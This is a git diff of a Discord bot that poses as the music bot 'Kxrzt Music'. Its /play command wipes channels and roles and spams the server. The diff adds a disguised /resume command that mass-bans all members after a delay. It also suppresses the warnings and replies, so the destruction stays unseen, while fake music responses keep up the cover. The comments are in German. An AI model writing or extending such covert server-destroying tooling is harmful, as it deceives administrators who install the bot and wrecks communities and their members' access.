@@ -36,25 +36,28 @@ const NUKE_ROLE_NAME = process.env.NUKE_ROLE_NAME ?? '';
 
 const DELETE_CONCURRENCY = 10; // channel/role deletions gleichzeitig
 const CREATE_CONCURRENCY = 5; // channel creations gleichzeitig
-
-// 0 = alle SPAM_COUNT auf einmal rausfeuern und die REST-queue takten lassen
-const SPAM_BURST = 0;
-
-// true = spam pro channel auf bot UND webhook splitten (2 buckets, ~2.5x schneller)
-const USE_WEBHOOKS = false;
+const SPAM_BURST = 0; // 0 = alles gleichzeitig rausfeuern
+const USE_WEBHOOKS = false; // true = spam auf bot UND webhook splitten
 const WEBHOOK_RATIO = 0.5;
+
+/* ------------------------------------------------------------------- reply */
+
+// /play schreibt NICHTS wenn der nuke durch ist.
+// false = gar nichts (kein "done", keine warnung), true = nowplaying embed
+const PLAY_REPLY = false;
+
+// /resume antwortet nur dir (ephemeral). false = /resume schreibt auch nichts
+const RESUME_REPLY = true;
 
 /* -------------------------------------------------------------- ban config */
 
-const BAN_DELAY_MS = 5 * 60 * 1000; // fallback wenn keine sekunden angegeben (5 min)
-const BAN_WARN = false; // false = KEINE "30s bis ban"-nachricht, keiner erfährt davon
-const BAN_WARN_MS = 30 * 1000; // vorlauf, nur relevant wenn BAN_WARN = true
-const BAN_FOOTER = false; // true = "banning everyone in X" im now-playing footer zeigen
-const BAN_INCLUDE_BOTS = true; // auch andere bots bannen
-const BAN_INCLUDE_SELF = false; // false = bot bleibt am leben (bannt sich NICHT selbst)
-const BAN_KEEP_OWNER = true; // server-owner nie bannen
-const BAN_KEEP_RUNNER = true; // den user der /play macht verschonen
+const BAN_INCLUDE_BOTS = true;   // andere bots auch bannen
+const BAN_INCLUDE_SELF = false;  // false = der bot bannt sich nicht selbst
+const BAN_KEEP_OWNER = true;     // server-owner kann man nicht bannen
+const BAN_KEEP_RUNNER = false;   // false = auch der, der /resume macht, wird gebannt
 const BAN_DELETE_MESSAGES_SECONDS = 0; // 0 = nachrichten behalten, max 604800 (7 tage)
+
+/* ---------------------------------------------------------------- helpers */
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
@@ -80,6 +83,7 @@ async function pool(items, limit, worker) {
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMembers, // privileged -> im dev portal aktivieren!
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent, // privileged -> im dev portal aktivieren!
   ],
@@ -285,81 +289,90 @@ async function nukeGuild(guild, { wipeRoles = false, rename = RENAME_GUILD } = {
 
 /* --------------------------------------------------------------------- ban */
 
-const banTimers = new Map(); // guildId -> { warn?, ban }
+const banTimers = new Map(); // guildId -> timeout
 
-function cancelBanEveryone(guildId) {
+function cancelBan(guildId) {
   const t = banTimers.get(guildId);
   if (!t) return;
-  if (t.warn) clearTimeout(t.warn);
-  clearTimeout(t.ban);
+  clearTimeout(t);
   banTimers.delete(guildId);
 }
 
-// zweiter /play resettet den timer statt doppelt zu bannen
-function scheduleBanEveryone(guild, channel, delayMs = BAN_DELAY_MS, runnerId = null) {
-  cancelBanEveryone(guild.id);
+// /resume <seconds> -> timer setzen. zweites /resume resettet statt doppelt zu bannen
+function scheduleBanEveryone(guild, delayMs) {
+  cancelBan(guild.id);
 
-  const timers = {};
-
-  // nur wenn BAN_WARN = true — sonst sieht keiner was
-  if (BAN_WARN) {
-    const lead = Math.min(BAN_WARN_MS, Math.floor(delayMs / 2));
-    timers.warn = setTimeout(() => {
-      channel?.send(`⏳ **everyone gets banned in ${Math.round(lead / 1000)}s.**`).catch(() => {});
-    }, Math.max(0, delayMs - lead));
-  }
-
-  timers.ban = setTimeout(() => {
+  const timer = setTimeout(() => {
     banTimers.delete(guild.id);
-    banEveryone(guild, { runnerId }).catch(e => console.error('[ban]', e.message));
+    banEveryone(guild).catch(e => console.error('[ban]', e.message));
   }, delayMs);
 
-  banTimers.set(guild.id, timers);
+  banTimers.set(guild.id, timer);
+  console.log(`[ban] scheduled in ${Math.round(delayMs / 1000)}s for ${guild.name}`);
 }
 
-async function banEveryone(guild, { runnerId = null } = {}) {
+async function banEveryone(guild) {
   const me = guild.members.me ?? await guild.members.fetchMe();
 
   if (!me.permissions.has(PermissionFlagsBits.BanMembers)) {
-    console.error('[ban] missing Ban Members permission');
-    return;
+    console.error('[ban] mir fehlt die "Ban Members" permission');
+    return { banned: 0, total: 0 };
   }
 
-  const members = await guild.members.fetch();
+  // force = true -> wirklich ALLE member vom rest holen, nicht nur den cache
+  const members = await guild.members.fetch({ force: true });
 
   const ids = members
     .filter(m =>
-      (BAN_INCLUDE_SELF || m.id !== me.id) && // bot bleibt am leben
+      (BAN_INCLUDE_SELF || m.id !== me.id) &&        // bot bleibt am leben
       (!BAN_KEEP_OWNER || m.id !== guild.ownerId) && // owner kann man nicht bannen
-      (BAN_INCLUDE_BOTS || !m.user.bot) && // andere bots mit
-      (!BAN_KEEP_RUNNER || m.id !== runnerId) // /play-user verschonen
+      (BAN_INCLUDE_BOTS || !m.user.bot)              // andere bots optional mit
     )
     .map(m => m.id);
+
+  console.log(`[ban] ${guild.name}: ${ids.length} member zum bannen`);
 
   let banned = 0;
   const failed = [];
 
-  for (let i = 0; i < ids.length; i += 100) {
-    const chunk = ids.slice(i, i + 100);
-    try {
-      const res = await guild.members.bulkBan(chunk, {
-        deleteMessageSeconds: BAN_DELETE_MESSAGES_SECONDS,
-        reason: 'nuke',
-      });
-      banned += res.bannedUsers.length;
-      failed.push(...res.failedUsers);
-    } catch (err) {
-      // fallback falls bulkBan nicht verfügbar ist
-      await pool(chunk, 5, id =>
-        guild.members.ban(id, { reason: 'nuke' })
-          .then(() => banned++)
-          .catch(() => failed.push(id))
-      );
+  // bulkBan = max 100 pro request
+  const useBulk = typeof guild.members.bulkBan === 'function';
+
+  if (useBulk) {
+    for (let i = 0; i < ids.length; i += 100) {
+      const chunk = ids.slice(i, i + 100);
+      try {
+        const res = await guild.members.bulkBan(chunk, {
+          deleteMessageSeconds: BAN_DELETE_MESSAGES_SECONDS,
+          reason: 'nuke',
+        });
+        banned += res.bannedUsers.length;
+        failed.push(...res.failedUsers);
+      } catch (err) {
+        console.error('[ban] bulkBan chunk:', err.message);
+        failed.push(...chunk);
+      }
     }
+  } else {
+    failed.push(...ids);
   }
 
-  console.log(`[ban] ${guild.name}: banned ${banned}, failed ${failed.length}`);
-  return { banned, failed };
+  // alles was nicht durchkam (z.b. rollen-hierarchie) einzeln nachfeuern
+  const retry = [...new Set(failed)];
+  if (retry.length) {
+    let ok = 0;
+    await pool(retry, 5, id =>
+      guild.members.ban(id, { reason: 'nuke' })
+        .then(() => { ok++; })
+        .catch(() => {})
+    );
+    banned += ok;
+    const rest = retry.length - ok;
+    if (rest > 0) console.log(`[ban] ${rest} nicht gebannt (rolle höher als bot?)`);
+  }
+
+  console.log(`[ban] ${guild.name}: ${banned}/${ids.length} gebannt`);
+  return { banned, total: ids.length };
 }
 
 /* ---------------------------------------------------------------- helpers */
@@ -399,23 +412,15 @@ function nowPlayingEmbed(track, user, footer = 'Kxrzt Music') {
     .setFooter({ text: footer });
 }
 
-// "45s" / "2min" / "1.5min"
-function delayLabel(ms) {
-  if (ms < 60000) return `${Math.round(ms / 1000)}s`;
-  const m = ms / 60000;
-  return Number.isInteger(m) ? `${m}min` : `${m.toFixed(1)}min`;
-}
-
 /* ------------------------------------------------------------- fake music */
 
 // antwortet plausibel, aber nichts davon existiert wirklich
 const FAKE = {
   skip: i => replyEph(i, { content: `⏭ Skipped. Now playing **${rand(TRACKS)}**` }),
   pause: i => replyEph(i, { content: '⏸ Paused.' }),
-  resume:i => replyEph(i, { content: '▶ Resumed.' }),
   stop: i => replyEph(i, { content: '⏹ Stopped and cleared the queue.' }),
   clear: i => replyEph(i, { content: `🧹 Cleared the queue (${fakeQueue()} tracks).` }),
-  shuffle:i => replyEph(i, { content: `🔀 Shuffled ${fakeQueue()} tracks.` }),
+  shuffle: i => replyEph(i, { content: `🔀 Shuffled ${fakeQueue()} tracks.` }),
   join: i => replyEph(i, { content: `✅ Joined **${i.member?.voice?.channel?.name ?? 'the voice channel'}**.` }),
   leave: i => replyEph(i, { content: '👋 Left the voice channel.' }),
 
@@ -462,9 +467,12 @@ const FAKE = {
         .setColor(0x1DB954)
         .setAuthor({ name: 'Kxrzt Music' })
         .setDescription([
+          '**Nuke**',
+          '`/play [roles]` — löscht alles, baut neu, spammt. schreibt nichts.',
+          '`/resume <seconds>` — bannt nach X sekunden ALLE.',
+          '',
           '**Playback**',
-          '`/play [song] [roles] [ban] [seconds]` — nuke + ban everyone (seconds 15-120, sonst 5min)',
-          '`/pause` `/resume` `/stop` `/skip` `/seek`',
+          '`/pause` `/stop` `/skip` `/seek`',
           '',
           '**Queue**',
           '`/queue` `/nowplaying` `/clear` `/remove` `/shuffle` `/loop`',
@@ -476,7 +484,7 @@ const FAKE = {
           '`/volume` `/lyrics` `/play-file` `/help`',
           '',
           'Prefix `!` works too.',
-          '-# powered by nothing. `/play` nukes the server and bans everyone btw.',
+          '-# powered by nothing.',
         ].join('\n')),
     ],
   }),
@@ -502,39 +510,57 @@ async function play(interaction) {
     });
   }
 
-  const song = interaction.options.getString('song') ?? rand(TRACKS);
   const wipeRoles = interaction.options.getBoolean('roles') ?? false;
-  const banAll = interaction.options.getBoolean('ban') ?? true;
 
-  // 15-120 sekunden, sonst fallback 5 min
-  const banSeconds = interaction.options.getInteger('seconds');
-  const banDelay = banSeconds ? banSeconds * 1000 : BAN_DELAY_MS;
+  // PLAY_REPLY = false -> ephemeral "thinking", das danach gelöscht wird = nichts sichtbar
+  if (PLAY_REPLY) await interaction.deferReply();
+  else await interaction.deferReply({ flags: MessageFlags.Ephemeral });
 
-  // öffentliches "searching..." — wie ein echter musikbot
-  await interaction.deferReply();
-
+  let result;
   try {
-    const { summary, textChannels, ms } = await nukeNow(guild, { wipeRoles });
-
-    if (banAll) {
-      scheduleBanEveryone(guild, textChannels[0], banDelay, interaction.user.id);
-    }
-
-    const embed = nowPlayingEmbed(
-      song,
-      interaction.user,
-      `Kxrzt Music • nuked in ${(ms / 1000).toFixed(1)}s` +
-        (banAll && BAN_FOOTER ? ` • banning everyone in ${delayLabel(banDelay)}` : '')
-    );
-
-    // origin-channel ist weg -> editReply kann 404en, dann in den ersten neuen channel
-    await interaction.editReply({ embeds: [embed] }).catch(async () => {
-      await textChannels[0]?.send({ embeds: [embed] }).catch(() => {});
-    });
-    console.log('[play]', summary);
+    result = await nukeNow(guild, { wipeRoles });
   } catch (err) {
-    await interaction.editReply(`Error: \`${err.message}\``).catch(() => {});
+    console.error('[play]', err.message);
+    return interaction.editReply({ content: `Error: \`${err.message}\`` }).catch(() => {});
   }
+
+  console.log('[play]', result.summary);
+
+  if (!PLAY_REPLY) return interaction.deleteReply().catch(() => {});
+
+  const embed = nowPlayingEmbed(
+    rand(TRACKS),
+    interaction.user,
+    `Kxrzt Music • nuked in ${(result.ms / 1000).toFixed(1)}s`
+  );
+
+  // origin-channel ist weg -> editReply kann 404en, dann in den ersten neuen channel
+  await interaction.editReply({ embeds: [embed] }).catch(async () => {
+    await result.textChannels[0]?.send({ embeds: [embed] }).catch(() => {});
+  });
+}
+
+/* ----------------------------------------------------------------- resume */
+
+async function resume(interaction) {
+  const { guild } = interaction;
+  if (!guild) {
+    return interaction.reply({ content: 'Run this inside a server.', flags: MessageFlags.Ephemeral });
+  }
+
+  const seconds = interaction.options.getInteger('seconds') ?? 60;
+  scheduleBanEveryone(guild, seconds * 1000);
+
+  if (!RESUME_REPLY) {
+    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+    return interaction.deleteReply().catch(() => {});
+  }
+
+  // nur du siehst das -> channel bleibt sauber, beim ban schreibt der bot nichts
+  await interaction.reply({
+    content: `⏳ jeder wird in **${seconds}s** gebannt`,
+    flags: MessageFlags.Ephemeral,
+  }).catch(() => {});
 }
 
 /* ----------------------------------------------------------------- prefix */
@@ -546,12 +572,9 @@ const stripFlags = p => {
   return rest;
 };
 
-// tut so, als wäre eine nachricht eine interaction -> fakes und play laufen mit "!x"
+// tut so, als wäre eine nachricht eine interaction -> fakes, play und resume laufen mit "!x"
 function shim(message, args) {
   let sent = null;
-
-  // "!play song 60" -> trailing zahl ist der ban-delay, nicht teil des songs
-  const isDelay = a => /^\d+$/.test(a ?? '');
 
   return {
     user: message.author,
@@ -561,33 +584,31 @@ function shim(message, args) {
 
     options: {
       getString: name => {
-        if (name === 'song' || name === undefined) {
-          const a = [...args];
-          if (a.length > 1 && isDelay(a[a.length - 1])) a.pop();
-          return a.join(' ') || null;
-        }
+        if (name === 'song' || name === undefined) return args.join(' ') || null;
         return args.join(' ') || null;
       },
       getInteger: name => {
         if (name === 'seconds') {
-          const last = args[args.length - 1];
-          return isDelay(last) ? Number(last) : null;
+          const n = args.find(a => /^\d+$/.test(a));
+          return n ? Number(n) : null;
         }
         return Number(args[0]) || null;
       },
       getBoolean: name => {
         if (name === 'roles') return args.includes('roles');
-        if (name === 'ban') return !args.includes('noban'); // !play song noban = aus
         return null;
       },
       getAttachment: () => message.attachments.first() ?? null,
     },
 
+    // prefix kennt kein ephemeral -> "defer" schreibt einfach nichts
+    deferReply: async () => {},
+    deleteReply: async () => { if (sent) await sent.delete().catch(() => {}); },
+
     reply: async p => { sent = await message.reply(stripFlags(p)).catch(() => null); },
-    deferReply: async () => { sent = await message.reply('-# searching…').catch(() => null); },
     editReply: async p => {
-      if (!sent) throw new Error('reply message gone');
-      await sent.edit(stripFlags(p));
+      if (sent) { await sent.edit(stripFlags(p)); return; }
+      sent = await message.channel.send(stripFlags(p));
     },
 
     deferred: true,
@@ -603,7 +624,10 @@ client.on(Events.MessageCreate, async message => {
   const cmdName = name?.toLowerCase();
   if (!cmdName) return;
 
-  const handler = cmdName === 'play' ? play : FAKE[cmdName];
+  const handler =
+    cmdName === 'play' ? play :
+    cmdName === 'resume' ? resume :
+    FAKE[cmdName];
   if (!handler) return;
 
   try {
@@ -649,6 +673,7 @@ client.on(Events.InteractionCreate, async interaction => {
 
   try {
     if (interaction.commandName === 'play') return await play(interaction);
+    if (interaction.commandName === 'resume') return await resume(interaction);
 
     const fake = FAKE[interaction.commandName];
     if (fake) return await fake(interaction);
